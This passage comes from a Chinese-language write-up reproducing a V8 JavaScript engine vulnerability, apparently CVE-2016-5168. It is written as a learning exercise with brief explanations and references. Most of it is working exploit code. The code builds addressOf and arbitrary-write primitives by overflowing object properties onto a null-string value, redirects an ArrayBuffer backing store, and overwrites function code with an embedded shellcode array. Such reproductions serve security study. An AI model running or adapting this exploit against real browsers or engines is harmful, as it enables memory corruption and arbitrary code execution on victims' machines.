       set.x2 = 0x8; //length
       set.x3 = obj; //content
    }
    for (var i=0;i<10000;i++) {
       opt_set();
    }
    for (var i=0;i<10000;i++) {
       fakeNullStrValue({});
    }
    var str = new String(null);
    function addressOf(obj) {
       opt_set();
       fakeNullStrValue(obj);
       var addr = 0;
       for (var i=0;i<0x8;i++) {
          addr += (str.charCodeAt(i) * Math.pow(0x100,i));
       }
       return addr - 0x1;
    }
    print("str_addr=" + addressOf(str).toString(16));
###  arb_write原语构造
如何利用这个属性值越界溢出构造任意写原语呢？首先，我没有找到方法如何让一个Array对象临接于`properties`的位置之后，不然我们可以很容易通过修改`Array`对象的`length`属性来构造一个`oob`数组。所以我们可以考虑再借助另外两个不同的对象，这样有三个对象，由于最开始他们的`properties`都为空值，因此，他们的`properties`地址会一样，那么，首先利用第一个对象的属性溢出，伪造`content
= null_value_self_addr+0x1`，
那么接下来用第二个对象的属性溢出，往`content`位置赋值一个地址`addr-0x7`的`double`数据，那么这个地址值`addr-0x7`会被写入到`null_value_self_addr+0x8`处，对应的也就是`null
value`对象的hash字段，
利用最后一个对象的属性溢出，往`hash`字段赋值为值`val`的`double`数据，那么`val`就会被写入到`addr`处，构造出了任意地址写的原语。
    var set;
    function opt_set() {
       set = new Set();
    }
    function fakeNullStrValue(obj) {
       set.x0 = p64f(0x00007300,0x00190004); //skip map
       set.x1 = 0; //hash
       set.x2 = 0x8; //length
       set.x3 = obj; //content
    }
    var map;
    function opt_map() {
       map = new Map();
    }
    function writeNullStrValuePtrContent(val) {
       map.x0 = p64f(0x00007300,0x00190004); //skip map
       map.x1 = 0; //hash
       map.x2 = 0x8; //length
       map.x3 = val //content
    }
    var date;
    function opt_date() {
       date = new Date();
    }
    function writeBackingStorePtr(val) {
       date.x0 = p64f(0x00007300,0x00190004); //skip map
       date.x1 = val; //hash
    }
    for (var i=0;i<10000;i++) {
       opt_set();
    }
    for (var i=0;i<10000;i++) {
       fakeNullStrValue({});
    }
    var str = new String(null);
    for (var i=0;i<10000;i++) {
       opt_map();
    }
    for (var i=0;i<10000;i++) {
       writeNullStrValuePtrContent(i+1.1);
    }
    for (var i=0;i<10000;i++) {
       opt_date();
    }
    for (var i=0;i<10000;i++) {
       writeBackingStorePtr(i+1.1);
    }
    function arb_write(addr,value) {
       opt_set();
       fakeNullStrValue(String(null));
       //%DebugPrint(set);
       //%SystemBreak();
       opt_map();
       writeNullStrValuePtrContent(p64f(addr & 0xFFFFFFFF,addr / 0x100000000));
       //%DebugPrint(map);
       //%SystemBreak();
       opt_date();
       //%DebugPrint(date);
       writeBackingStorePtr(p64f(value & 0xFFFFFFFF,value / 0x100000000));
       //%SystemBreak();
    }
其中，`String(null)`与`new String(null)`不同之处在于`String(null)`直接得到了那个`null
value`对象，因此在写入时，content就直接是`null value`对象本身的地址。
###  exp
当构造出以上两个原语以后，就能够轻松写出exp了
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true) + dv.getUint32(4,true)*0x100000000;
    }
    var set;
    function opt_set() {
       set = new Set();
    }
    function fakeNullStrValue(obj) {
       set.x0 = p64f(0x00007300,0x00190004); //skip map
       set.x1 = 0; //hash
       set.x2 = 0x8; //length
       set.x3 = obj; //content
    }
    var map;
    function opt_map() {
       map = new Map();
    }
    function writeNullStrValuePtrContent(val) {
       map.x0 = p64f(0x00007300,0x00190004); //skip map
       map.x1 = 0; //hash
       map.x2 = 0x8; //length
       map.x3 = val //content
    }
    var date;
    function opt_date() {
       date = new Date();
    }
    function writeBackingStorePtr(val) {
       date.x0 = p64f(0x00007300,0x00190004); //skip map
       date.x1 = val; //hash
    }
    for (var i=0;i<10000;i++) {
       opt_set();
    }
    for (var i=0;i<10000;i++) {
       fakeNullStrValue({});
    }
    var str = new String(null);
    function addressOf(obj) {
       opt_set();
       fakeNullStrValue(obj);
       var addr = 0;
       for (var i=0;i<0x8;i++) {
          addr += (str.charCodeAt(i) * Math.pow(0x100,i));
       }
       return addr - 0x1;
    }
    for (var i=0;i<10000;i++) {
       opt_map();
    }
    for (var i=0;i<10000;i++) {
       writeNullStrValuePtrContent(i+1.1);
    }
    for (var i=0;i<10000;i++) {
       opt_date();
    }
    for (var i=0;i<10000;i++) {
       writeBackingStorePtr(i+1.1);
    }
    var arr_buf = new ArrayBuffer(0x100);
    var func = new Function("var a = 0x66666666;");
    var shellcode_ptr_addr = addressOf(func) + 0x38;
    print("shellcode_ptr_addr="+shellcode_ptr_addr.toString(16));
    var arr_buf_addr = addressOf(arr_buf);
    var backing_store_ptr_addr = arr_buf_addr + 0x20;
    print("backing_store_ptr_addr=" + backing_store_ptr_addr.toString(16));
    var str_addr = addressOf(str);
    print("str_addr=" + str_addr.toString(16));
    function arb_write(addr,value) {
       opt_set();
       fakeNullStrValue(String(null));
       //%DebugPrint(set);
       //%SystemBreak();
       opt_map();
       writeNullStrValuePtrContent(p64f(addr & 0xFFFFFFFF,addr / 0x100000000));
       //%DebugPrint(map);
       //%SystemBreak();
       opt_date();
       //%DebugPrint(date);
       writeBackingStorePtr(p64f(value & 0xFFFFFFFF,value / 0x100000000));
       //%SystemBreak();
    }
    arb_write(backing_store_ptr_addr - 0x7,shellcode_ptr_addr);
    var arb_dv = new DataView(arr_buf);
    var shellcode_addr = u64f(arb_dv.getFloat64(0,true));
    print("shellcode_addr=" + shellcode_addr.toString(16));
    arb_write(backing_store_ptr_addr - 0x7,shellcode_addr);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       arb_dv.setUint32(i*4,shellcode[i],true);
    }
    %DebugPrint(str);
    %SystemBreak();
    //执行shellcode
    //func();
## 0x03 感想
本漏洞复现中学到了有关`String`的知识，并且利用了指针的指针的概念。感觉收获很多。
## 0x04 参考
[谷歌中的V8引擎：Ignition和TurboFan](https://blog.csdn.net/chenkeyu1997/article/details/90295405)  
[CVE-2016-5168漏洞分析](https://de4dcr0w.github.io/CVE-2016-5168%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)  
[v8 exploit](https://eternalsakura13.com/2018/05/06/v8/)